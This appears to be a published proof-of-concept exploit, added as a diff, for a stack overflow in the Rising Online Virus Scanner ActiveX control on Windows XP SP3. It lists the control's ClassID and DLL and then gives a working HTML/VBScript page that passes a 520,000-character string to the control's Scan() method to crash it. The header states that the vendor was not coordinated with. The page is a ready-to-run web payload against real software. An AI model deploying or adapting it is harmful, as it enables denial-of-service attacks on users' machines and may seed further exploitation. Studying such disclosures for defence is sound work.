@@ -1,0 +1,27 @@
+# Exploit Title: Rising Online Virus Scanner ActiveX Control DoS (Stack overflow)
+# Author: wirebonder
+# Software Link: http://www.rising-global.com/products/online-scanner-intro.html
+# Tested on: Windows XP sp3
+
+
+##
+# ProgID: 	RavOLCtlLib.RavOnline
+# ClassID:	9FAFB576-6933-4CCC-AB3D-B988EC43D04E
+# Member: 	Scan()
+# File:   	C:\Programme\Rising\RavOL\RavOLCtl.dll
+# script safe:	true
+# init safe: 	true
+#
+# Because Bullshit like this is unsaleable and i don't want to waste time
+# coordinating patches with this vendor this is a fulldisc publishing.
+##
+
+<html>
+<body>
+<object classid='clsid:9FAFB576-6933-4CCC-AB3D-B988EC43D04E' id='obj'></object>
+<script language='vbscript'>
+	buf=String(520000, "A")
+	obj.Scan buf
+</script>
+</body>
+</html>
